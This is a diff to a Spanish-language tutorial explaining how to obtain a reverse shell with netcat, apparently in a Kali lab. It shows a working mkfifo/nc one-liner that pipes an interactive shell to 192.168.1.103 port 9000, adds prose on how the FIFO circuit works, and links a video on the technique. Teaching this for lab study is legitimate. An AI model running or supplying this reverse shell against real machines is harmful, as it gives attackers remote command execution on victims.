@@ -52,7 +52,12 @@ Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como e
   ```
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 192.168.1.103 9000 > /tmp/f
   ```
-  Este comando crea un canal de comunicación bidireccional entre la máquina víctima y la atacante, usando un archivo FIFO en /tmp/f. Primero, elimina /tmp/f si existe y luego crea un FIFO con mkfifo. Utiliza cat para leer este FIFO y pasa la salida a sh -i, creando una shell interactiva que redirige tanto la entrada estándar como la salida estándar y el error estándar a través de Netcat hacia la dirección IP 192.168.1.103 en el puerto 9000. Finalmente, la salida de Netcat se redirige de nuevo al FIFO, completando el circuito para la comunicación bidireccional.
+  Este comando crea un canal de comunicación bidireccional entre la máquina víctima y la atacante, usando un archivo FIFO en /tmp/f. Primero, elimina /tmp/f si existe y luego crea un FIFO con mkfifo. Utiliza cat para leer este FIFO y pasa la salida a sh -i, creando una shell interactiva que redirige tanto la entrada estándar como la salida estándar y el error estándar a través de Netcat hacia la dirección IP 192.168.1.103 en el puerto 9000. Finalmente, la salida de Netcat se redirige de nuevo al FIFO, completando el circuito para la comunicación bidireccional. Los datos circulan a través de la conexión con la máquina atacante en la ip 192.168.1.103 y el puerto 9000, y la máquina vulnerable por medio del fichero FIFO.
 
-- Tras establecer la conexión, posremos ejecutar comandos en la máquina objetivo desde la máquina atacante.
+  Recomendación: Ver Exploring mkfifo / nc Reverse Shell ➡ https://www.youtube.com/watch?v=_q_ZCy-hEqg
+
+- Tras ejecutar este comando se obtiene una shell reverse en la máquina atacante. Se establece la conexión, podemos ejecutar comandos en la máquina objetivo desde la máquina atacante.
+
+
+#### Ejemplo con bash
 
